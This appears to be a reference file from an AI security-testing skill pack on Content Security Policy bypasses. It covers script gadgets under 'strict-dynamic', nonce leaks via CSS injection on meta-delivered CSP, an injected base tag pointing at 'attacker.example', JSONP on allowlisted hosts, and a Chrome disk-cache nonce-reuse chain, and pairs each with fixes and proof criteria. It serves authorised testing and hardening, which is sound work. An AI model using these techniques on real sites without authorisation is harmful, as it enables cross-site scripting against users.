# CSP bypass depth, and browser-cache-to-XSS

SKILL.md step 9 and the Bypass Techniques block name the CSP bypasses. This file
carries the mechanism, the directive semantics exactly as specified, and for each
one the **Status** (what is verified, against which source, on which date),
**Killed by** and **Proof bar**. A technique with no Status line is not verified.

Directive names, keywords and header values below are quoted exactly. A wrong
character makes a policy mean something else.

---

## 1. `'strict-dynamic'` and its real failure modes

**Status** (verified 2026-10-11 against the CSP Level 3 editor's draft, sections
6.7.1.1 and 8.2, and MDN `Content-Security-Policy: script-src`): current and
widely deployed. These are the two semantics that matter:

- When `'strict-dynamic'` is present in a script directive, **host-source and
  scheme-source expressions are ignored**, along with `'self'` and
  `'unsafe-inline'`. Only nonces and hashes still grant trust. CSP3 8.2 and MDN
  both say so: the allowlist stops mattering the moment the keyword is in the
  policy.
- Trust propagates by **parser metadata**, not by nonce inheritance. CSP3 6.7.1.1:
  "If the request's parser metadata is 'parser-inserted', return 'Blocked'", and
  8.2 states that requests triggered by non-parser-inserted script elements are
  allowed. In practice: `document.write('<script src=...>')` does not load;
  `document.createElement('script')` with `.src` set and then appended does.

**Failure mode 1, the one that actually pays: script gadgets.** Because any script
already trusted can create more script with no nonce, a gadget in a library that
builds a script element, or an element URL, from data in the DOM converts markup
injection into execution under a nonce-only policy. The research is Lekies,
Kotowicz, Groß, Vela Nava and Johns, "Code-Reuse Attacks for the Web: Breaking
Cross-Site Scripting Mitigations via Script Gadgets", ACM CCS 2017 (Black Hat USA
2017: "Don't Trust the DOM"), which reports gadget-based bypasses across most
deployed mitigations in 16 popular JavaScript libraries. Per-mitigation bypass
counts circulate in slide form; the figures were not confirmed against the paper
this session, so cite the paper, not a count.

Where to look, in order: client-side templating and expression parsers (they need
no `innerHTML` and no `eval`, which is why they beat `'unsafe-eval'` removal too),
data-attribute-driven initialisers (`data-*` read by a widget and passed to a URL
or handler), jQuery-era plugin bootstrappers, and any `querySelectorAll` loop that
feeds attribute values into `new Function`, `setAttribute('src', ...)` or
`insertAdjacentHTML`.

```bash
# Gadget hunting in the target's own bundles: attribute value reaching a script-creating sink.
grep -rn "createElement(['\"]script\|\.src *=\|new Function(\|insertAdjacentHTML\|setAttribute(['\"]src" --include="*.js"
grep -rn "querySelectorAll\|dataset\.\|getAttribute(['\"]data-" --include="*.js"
```

**Failure mode 2: the policy means different things in different engines.** MDN's
backwards-compatibility example is the trap. `script-src 'unsafe-inline' https:
'nonce-abcdefg' 'strict-dynamic'` behaves as `'unsafe-inline' https:` under CSP1,
as `https: 'nonce-abcdefg'` under CSP2, and as `'nonce-abcdefg' 'strict-dynamic'`
under CSP3. Report the effective behaviour in the browser you tested, with the
version recorded, not the header string.

**Failure mode 3: inline is still inline.** `'strict-dynamic'` grants nothing to
inline event handlers or to inline `<script>` without a nonce or hash. If your
only primitive is an `onerror=` attribute, a nonce-plus-`strict-dynamic` policy
blocks it, and the finding is the injection, filed where it belongs.

**Killed by:** `require-trusted-types-for 'script'` together with the
`trusted-types` directive naming the allowed policies. Verified 2026-10-11 on MDN:
the only documented value is `'script'`, it makes DOM XSS sinks reject plain
strings with a `TypeError` and accept only values minted by a Trusted Types
policy, and MDN marks it Baseline "newly available" since February 2026. This is
what closes the gadget path, because the gadget's sink assignment is the thing that
starts throwing.

**Proof bar:** your own script loads and executes with the page's policy active
and **zero** CSP violations in the console. A `Refused to load` message plus an
`alert()` that never fired is not a bypass.

---

## 2. Nonce reuse and nonce theft

**Status** (verified 2026-10-11 against MDN's `nonce` global attribute page and
MDN `script-src`): nonce hiding is implemented and documented. The `nonce`
*content attribute* is deliberately hidden, so `script.getAttribute("nonce")`
returns an empty string while the IDL property `script.nonce` returns the real
value. MDN names the attack this closes: a CSS attribute selector such as
`script[nonce~="whatever"] { background: url(...) }`, which would otherwise leak
the value. Treat plain CSS-injection nonce exfiltration from a header-delivered
CSP as **dead**.

Paths that are still open:

- **CSP delivered in a `<meta>` tag.** The policy string, nonce included, sits in
  the `content=` attribute of a `<meta>` element, which nonce hiding does not
  cover, so attribute-selector CSS can still recover it. Verified 2026-10-11 from
  Jorian Woltjer's research write-up "Nonce CSP bypass using Disk Cache", which
  states the leak-merging method works in Chrome and Firefox while the
  single-request `attr()` variant is Chrome-only. The write-up gives no Chrome
  version and no test date, so **reliability against current Chrome is
  unverified**: re-measure before relying on it. Remediation to recommend
  regardless: deliver CSP as a response header.
- **A nonce that is not per-request.** MDN is explicit that the value must be
  generated dynamically and be unique for every HTTP request. Any cached nonced
  HTML breaks that: a CDN or reverse proxy caching the document, a static
  build that bakes the nonce in, or a browser-cache fallback (section 5 below).
  Test by fetching the same page twice with no session and diffing the nonce.
- **A reflected nonce.** A templating bug that echoes the nonce into the response
  body hands it to you directly. The nonce-reflection probe already lives in
  `security-arsenal`; use it instead of writing another one.

**Killed by:** header-delivered CSP, a fresh cryptographically random nonce per
response, and `Cache-Control` on documents that carry one.

**Proof bar:** a `<script nonce="...">` you injected executes, with the nonce value
you recovered shown next to the response that leaked it, in the tester's own
browser. State the browser and version: this is the area where a stale PoC fails
silently.

---

## 3. `base-uri` omission

**Status** (verified 2026-10-11 against MDN `Content-Security-Policy: base-uri`
and CSP3 sections 7.3 and 8.5): current. Two facts decide it. MDN's directive
table records **no `default-src` fallback** for `base-uri`: leave it out and any
URL is allowed, with the user agent simply using whatever the `<base>` element
says. CSP3 7.3 warns that an injected base element subverts an otherwise safe page
through relative-URL resolution, and 8.5 recommends `'self'` or `'none'` as part
of a strict policy.

**Mechanism.** A markup injection that cannot execute script by itself injects
`<base href="https://attacker.example/">`. Every relative `src` and `href` in the
document now resolves against the attacker's origin, including
`<script src="/app.js">`, and the nonce stays on that element because the nonce
belongs to the element, not to the URL. A nonce-based or `strict-dynamic` policy
that omits `base-uri` therefore loses to an injection that only adds one tag. The
markdown-renderer instance of exactly this gadget is CVE-2025-54075 /
GHSA-cj6r-rrr9-fg82, where the attribute filter checked `on*`, `href` and `src`
but not `href` on `<base>`.

Check the policy for the directive before anything else:

```bash
curl -sI "https://target.example/" | tr ';' '\n' | grep -i "content-security-policy\|base-uri\|object-src\|script-src"
```

**Killed by:** `base-uri 'none'` or `base-uri 'self'`; and on the application
side, treating `<base>` as a forbidden tag in any HTML allowlist.

**Proof bar:** the browser requests your host for the relative path, and the script
it serves executes. Show both the network entry and the execution. An accepted
`<base>` tag that no relative URL depends on is a weakness note, not an XSS.

---

## 4. JSONP endpoints on allowlisted origins

**Status** (verified 2026-10-11): still the most reliable allowlist bypass, for a
reason that follows directly from the CORB rules in
`callback-and-script-inclusion.md`: CORB does not block JavaScript MIME types,
including JSONP. If `script-src` allowlists an origin, and anything on that origin
answers with attacker-shaped JavaScript, the policy is decoration.

Procedure: enumerate the allowlisted hosts from the policy, then for each host
probe for a `callback`-style parameter whose value lands in function-call position
with no character restriction. Unrestricted callback means arbitrary JavaScript;
restricted to `[\w.]` means method invocation only, which is the SOME primitive in
`callback-and-script-inclusion.md`.

Two cautions. First, published lists of JSONP endpoints on major CDNs age fast;
re-test the endpoint yourself in the current browser before putting it in a report.
Second, if the policy also contains `'strict-dynamic'`, the host allowlist is
ignored and this path is closed, per section 1.

**Killed by:** `'strict-dynamic'` with nonces; removing JSONP from the allowlisted
origin; narrowing the allowlist to a path-specific source expression rather than a
whole host.

**Proof bar:** your JavaScript executes on the target origin with no CSP violation
logged, and the console shows the loaded URL on the allowlisted host.

---

## 5. Browser-cache-to-XSS (Chrome disk cache and bfcache)

**Status** (verified 2026-10-11 against Jorian Woltjer's "Nonce CSP bypass using
Disk Cache", the SECCON CTF 2022 Quals "spanote" author write-up it builds on, and
Chrome's own `bfcache-ccns` documentation): the mechanism is documented and
Chrome-specific in its details. **Reliability against current Chrome is
unverified**, because neither write-up names a Chrome version or a test date, and
Chrome has changed both bfcache eligibility and HTTP cache keying since. Verify
every step with DevTools in the browser you will cite. This is a chain accelerator,
never the whole finding.

**Mechanism.** Two caches interact. The back/forward cache (bfcache) stores a full
page snapshot including the JavaScript heap, and wins on history navigation. The
disk cache stores response bytes only. To replay *bytes* in a *fresh* JavaScript
context, you have to keep the page out of bfcache so the history navigation falls
back to disk cache. Holding a live window reference does exactly that: opening the
target with `window.open()` keeps a related active content relationship, which
Chrome reports as a not-restored reason, and `history.back()` then serves the old
response from disk cache. The second documented route is eviction: navigate
through enough documents to push the entry out of bfcache (the write-up uses a
limit of six) while the older HTTP response stays on disk.

**The nonce-reuse variant**, which is why this belongs in a CSP file: leak the
nonce from a `<meta>`-delivered CSP with CSS injection (section 2), change the
injected payload without changing the nonce, then force the bfcache-to-disk-cache
fallback so the browser loads the old HTML carrying the old nonce while the
payload it reads is fetched fresh. Chrome's cache partitioning keys entries by
top-level site, and the write-up works around that with a distinct query parameter
rather than defeating it.

**Verified Chrome change that invalidates older PoCs** (Chrome documentation,
`bfcache-ccns`, read 2026-10-11): `Cache-Control: no-store` no longer reliably
keeps a page out of bfcache. Chrome began experiments in Chrome 116 and states it
was "completing the final rollout to 100% of users over March and April 2025".
Such pages are evicted when cookies or other authorization state change, are
excluded when the page uses WebSocket, WebTransport or WebRTC, are evicted if a
`fetch` or XHR from the page returns a `no-store` response, stay in bfcache for 3
minutes instead of 10, and can be disabled by the enterprise policy
`AllowBackForwardCacheForCacheControlNoStorePageEnabled`. Consequence for testing:
decide bfcache eligibility from the actual not-restored reason, never from the
response headers.

**Instrumentation**, all in the tester's own browser and own session: the Network
panel's "from disk cache" marker, Application then Back/forward cache, and the
`notRestoredReasons` reporting Chrome exposes. If `history.back()` restores live
state, you hit bfcache and the chain is not armed. Old bytes with a fresh script
context is the state you want.

**Killed by:** delivering CSP in a header rather than `<meta>`; not caching
documents that carry a nonce; and, for the priming step, anything that prevents an
attacker-influenced response from being stored under a URL that is later treated as
a document.

**Proof bar:** the full sequence replayed from a clean profile, with the DevTools
evidence for each step, the exact Chrome version recorded, and your canary
executing after the back navigation. Note explicitly that it is Chrome-only unless
you measured another engine. Never prime a cache in anyone else's browser profile.
